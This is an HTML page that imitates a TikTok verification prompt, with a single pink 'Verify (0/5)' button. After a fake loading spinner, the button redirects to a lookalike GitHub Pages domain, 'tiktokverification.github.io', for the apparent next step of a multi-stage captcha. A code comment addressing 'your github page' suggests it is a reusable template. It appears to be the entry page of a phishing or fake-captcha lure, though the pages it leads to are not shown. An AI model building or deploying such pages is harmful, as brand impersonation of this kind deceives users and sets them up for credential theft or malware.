<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html {
            margin: 0; padding: 0; height: 100%;
            background: #ffffff;
            font-family: "Proxima Nova", "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-end; 
            /* Positioning: Sits right in the sweet spot for the thumb */
            padding-bottom: 15vh; 
            -webkit-font-smoothing: antialiased;
            overflow: hidden;
        }

        #verify-btn {
            position: relative;
            /* Maximum horizontal span */
            width: 98%; 
            height: 54px; 
            background-color: #FE2C55; 
            color: #ffffff;
            border: none;
            border-radius: 4px;
            
            /* Typography: Regular weight, no bolding, wide and clean */
            font-size: 17px;
            font-weight: 400;
            letter-spacing: 0.5px; 
            white-space: nowrap; 
            
            cursor: pointer;
            transition: background-color 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        /* Grayed out state */
        #verify-btn.loading {
            background-color: #E1E1E2; 
            color: transparent;
            pointer-events: none;
        }

        /* CSS Spinner */
        .spinner {
            display: none;
            position: absolute;
            width: 22px;
            height: 22px;
            border: 2.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s linear infinite;
        }

        #verify-btn.loading .spinner {
            display: block;
            border-top-color: #8A8B91;
            border-left-color: rgba(0,0,0,0.1);
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <button id="verify-btn" onclick="startLoading()">
        <span id="btn-text">Verify (0/5)</span>
        <div class="spinner"></div>
    </button>

    <script>
        function startLoading() {
            const btn = document.getElementById('verify-btn');
            
            // 1. Switch to loading state
            btn.classList.add('loading');
            
            // 2. Wait 1.2 seconds then redirect to your github page
            setTimeout(() => {
                window.location.href = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
            }, 1200);
        }
    </script>

</body>
</html>
